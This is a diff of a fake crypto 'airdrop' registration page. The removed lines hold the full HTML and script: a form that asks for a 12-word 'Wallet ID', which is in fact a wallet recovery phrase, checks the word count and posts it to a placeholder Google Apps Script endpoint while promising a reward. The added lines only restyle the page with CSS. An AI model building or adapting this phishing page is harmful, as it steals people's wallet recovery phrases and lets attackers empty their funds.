@@ -1,107 +1,65 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Register for the Airdrop</title>
-  <style>
-    body {
-      background: #121212;
-      color: #ffffff;
-      font-family: Arial, sans-serif;
-      padding: 40px;
-    }
-    h1 {
-      color: #00ffcc;
-    }
-    input[type="text"], input[type="password"] {
-      width: 300px;
-      padding: 10px;
-      margin: 10px 0;
-      border-radius: 8px;
-      border: none;
-    }
-    input[type="submit"] {
-      background: #00ffcc;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 8px;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    .wallet-input {
-      position: relative;
-    }
-    .toggle-eye {
-      position: absolute;
-      right: 10px;
-      top: 50%;
-      transform: translateY(-50%);
-      cursor: pointer;
-    }
-    .success-message {
-      margin-top: 20px;
-      color: #00ffcc;
-      font-weight: bold;
-    }
-  </style>
-</head>
-<body>
+<style>
+  body {
+    background: url('airdrop-bg.png') no-repeat center center fixed;
+    background-size: cover;
+    color: #ffffff;
+    font-family: Arial, sans-serif;
+    padding: 40px;
+  }
 
-  <h1>Register for the Airdrop</h1>
+  h1 {
+    color: #ffffff;
+    background: rgba(0, 0, 0, 0.6);
+    display: inline-block;
+    padding: 10px 20px;
+    border-radius: 12px;
+  }
 
-  <form onsubmit="submitForm(event)">
-    <input type="text" id="username" placeholder="Username" required><br>
+  form {
+    background: rgba(0, 0, 0, 0.7);
+    padding: 30px;
+    border-radius: 15px;
+    max-width: 400px;
+    margin-top: 30px;
+  }
 
-    <div class="wallet-input">
-      <input type="password" id="wallet" placeholder="Wallet ID (12 words)" required>
-      <span class="toggle-eye" onclick="toggleWallet()">👁️</span>
-    </div>
+  input[type="text"], input[type="password"] {
+    width: 100%;
+    padding: 10px;
+    margin: 10px 0;
+    border-radius: 8px;
+    border: none;
+  }
 
-    <input type="text" id="referral" placeholder="Referral Code"><br>
+  input[type="submit"] {
+    background: #00ffcc;
+    padding: 10px 20px;
+    border: none;
+    border-radius: 8px;
+    font-weight: bold;
+    cursor: pointer;
+    width: 100%;
+  }
 
-    <input type="submit" value="Submit">
-  </form>
+  .wallet-input {
+    position: relative;
+  }
 
-  <div class="success-message" id="successMsg"></div>
+  .toggle-eye {
+    position: absolute;
+    right: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+    color: #000;
+    background: #fff;
+    padding: 0 5px;
+    border-radius: 50%;
+  }
 
-  <script>
-    function toggleWallet() {
-      const walletField = document.getElementById("wallet");
-      walletField.type = walletField.type === "password" ? "text" : "password";
-    }
-
-    function submitForm(e) {
-      e.preventDefault();
-
-      const username = document.getElementById("username").value.trim();
-      const wallet = document.getElementById("wallet").value.trim();
-      const referral = document.getElementById("referral").value.trim();
-      const successMsg = document.getElementById("successMsg");
-
-      const words = wallet.split(/\s+/);
-      if (words.length !== 12) {
-        alert("Wallet ID must contain exactly 12 words.");
-        return;
-      }
-
-      // Replace with your deployed Google Apps Script URL
-      const endpoint = "YOUR_GOOGLE_SCRIPT_WEB_APP_URL";
-
-      fetch(endpoint, {
-        method: "POST",
-        body: JSON.stringify({ username, wallet, referral }),
-        headers: { "Content-Type": "application/json" }
-      })
-      .then(res => res.json())
-      .then(data => {
-        successMsg.innerText = "Thank you for registering! You'll receive your reward shortly.";
-      })
-      .catch(err => {
-        alert("Something went wrong. Please try again.");
-        console.error(err);
-      });
-    }
-  </script>
-
-</body>
-</html>
+  .success-message {
+    margin-top: 20px;
+    color: #00ffcc;
+    font-weight: bold;
+  }
+</style>
